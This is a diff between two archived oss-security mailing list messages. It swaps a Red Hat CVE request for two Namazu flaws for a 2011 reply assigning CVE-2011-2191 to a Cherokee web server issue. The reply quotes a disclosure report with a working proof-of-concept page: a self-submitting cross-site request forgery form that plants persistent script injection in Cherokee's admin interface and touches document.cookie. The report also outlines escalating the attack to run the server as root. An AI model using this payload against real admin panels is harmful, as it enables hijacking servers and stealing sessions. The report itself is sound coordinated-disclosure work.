@@ -1,65 +1,72 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2011/11/23/2
-Message-ID: <4ECCD621.6010309@redhat.com>
-Date: Wed, 23 Nov 2011 12:16:49 +0100
-From: Jan Lieskovsky <jlieskov@...hat.com>
-To: "Steven M. Christey" <coley@...us.mitre.org>
-CC: oss-security@...ts.openwall.com
-Subject: CVE Request --  1) Namazu v2.0.21: XSS flaw by processing HTTP cookies 2) Namazu v2.0.20: Stack-based buffer overflow by replacing blank "uri" field value
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2011/06/06/22
+Message-ID: <1034398767.510283.1307389066776.JavaMail.root@zmail01.collab.prod.int.phx2.redhat.com>
+Date: Mon, 6 Jun 2011 15:37:46 -0400 (EDT)
+From: Josh Bressers <bressers@...hat.com>
+To: oss-security@...ts.openwall.com
+Cc: Alvaro Lopez Ortega <alvaro@...ality.com>, coley <coley@...re.org>
+Subject: Re: Security issue in cherokee
 Content-Type: text/plain; charset=utf-8
 
-Hello Kurt, Steve, vendors,
+As best as I can tell, this is the same request from Jan on 2011-06-02.
 
-   based on:
-   [1] https://bugs.gentoo.org/show_bug.cgi?id=391259
-   [2] http://www.namazu.org/security.html.en
+Please use CVE-2011-2191
 
-the following two issues (when compared against [3]) doesn't
-seem to have CVE ids yet:
-I) There is cross-site scripting vulnerability for IE 6,7 in version 
-2.0.20 or older.
+Thanks.
 
-    References:
-    http://www.namazu.org/#stable
-    http://www.namazu.org/security.html#cross-site-scripting
+-- 
+    JB
 
-    Further issue details are described in:
-    https://bugzilla.redhat.com/show_bug.cgi?id=756348
-
-    Note: A CVE-2011-* identifier should be assigned for this.
-    =====
-
-II) To 2.0.19 or a version that is older than 2.0.19, there is a 
-vulnerability of overrunning in the buffer. It recommends since Namazu 
-2.0.20 to be used.
-
-    References:
-    http://www.namazu.org/#stable
-    http://www.namazu.org/security.html.en
-
-    Further issue details are described in:
-    https://bugzilla.redhat.com/show_bug.cgi?id=756341
-
-    Note: A CVE-2009-* identifier should be assigned to this.
-    =====
-
-Could you allocate two CVE ids (one CVE-2011-*, the other CVE-2009-*)
-for these two flaws?
-
-According to:
-[3] http://cve.mitre.org/cgi-bin/cvekey.cgi?keyword=namazu
-
-the last CVE id, assigned for Namazu, was CVE-2008-1468 for the
-"XSS UTF-7" issue, which corresponds to:
-
-"To 2.0.17 or a version that is older than 2.0.17 There is a weakness of 
-retrieval type by the misidentification of the encode automatic 
-operation recognition of Web browser that is the UTF-7 encoding. It 
-recommends since 2.0.18 as much as possible to be used." record
-from [2].
-
-Should you need any further details due these two, let me know.
-
-Thank you && Regards, Jan.
---
-Jan iankko Lieskovsky / Red Hat Security Response Team
+----- Original Message -----
+> A security bug was reported against cherokee in Ubuntu. You are being
+> emailed as the upstream contact. Please keep oss-security[1] CC'd for
+> any updates on this issue.
+> 
+> This issue should be considered public, but has not yet been assigned
+> a
+> CVE. Once a CVE is assigned, please mention it in any changelogs.
+> 
+> Details from the public bug follow:
+> https://launchpad.net/bugs/784632
+> 
+> From the reporter:
+> ----
+> The cherokee admin server is vulnerable to csrf.
+> 
+> Using csrf it is possible to produce a persistent xss in several pages
+> -
+> including the 'status' page via the 'nickname field' of a vserver.
+> An example of this is the following:
+> 
+> <html>
+> <body>
+> <form action="http://127.0.0.1:9090/vserver/apply" method="post"
+> id="xssform">
+> <input type="text" name="tmp!new_droot" value='/var/www/'></input>
+> <input type="text" name="tmp!new_nick" value='" onselect=alert(1)
+> autofocus> <embed src="javascript:alert(document.cookie)">'></input>
+> </form>
+> <script>document.getElementById("xssform").submit();</script>
+> </body>
+> 
+> A Worst case scenario could be something like the following:
+> If a user is logged in and the cherokee admin server is running on
+> localhost:9090 then if they visit a $bad page - the bad page may be
+> able
+> to send requests to the server so as to reconfigure it to:
+> 
+> 1. run as root
+> 2. the logging of error(or access) will run a command ...
+> ----
+> 
+> Thanks in advance for your cooperation in coordinating a fix for this
+> issue,
+> 
+> Jamie Strandboge
+> 
+> [1] oss-security@...ts.openwall.com is a public mailing list for
+> people to collaborate on security vulnerabilities and coordinate
+> security updates.
+> 
+> --
+> Jamie Strandboge | http://www.canonical.com
